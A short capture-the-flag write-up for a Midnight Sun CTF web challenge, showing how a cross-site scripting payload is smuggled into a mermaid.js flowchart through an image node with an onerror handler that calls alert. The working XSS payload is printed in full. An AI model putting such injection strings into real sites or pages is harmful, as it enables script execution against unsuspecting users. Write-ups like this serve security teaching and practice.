## Marcozuckerbergo

* Category  : Web
* Problem	: Fine, I'll use a damn lib. Let's see if it's any better.
* URL		: `http://marcozuckerbergo-01.play.midnightsunctf.se:3002`

----

So it was also a xss challenge where we were suppose to xss at http://marcozuckerbergo-01.play.midnightsunctf.se:3002/markdown?input=input and submit solution with xss payload.
The source code revelas the use of text-to-Flowchart library `mermaid.js`.

So i started to google for xss in the library 
```
site:github.com inurl:'knsv/mermaid' xss
```

Didnt really got anything. Then I thought to xss it the same way as `marcodowno`. If we can insert a Image in flowchart we can xss it. so googling

```
site:github.com inurl:'knsv/mermaid' insert image 
```

and we have `https://github.com/knsv/mermaid/issues/548` so
```
graph LR; Systemstart-->Icon(<img src='xx' onerror=alert`1`>)
```

Will try to render the image 
```
<img src='xx' onerror=alert`1`>
```
and we have xss
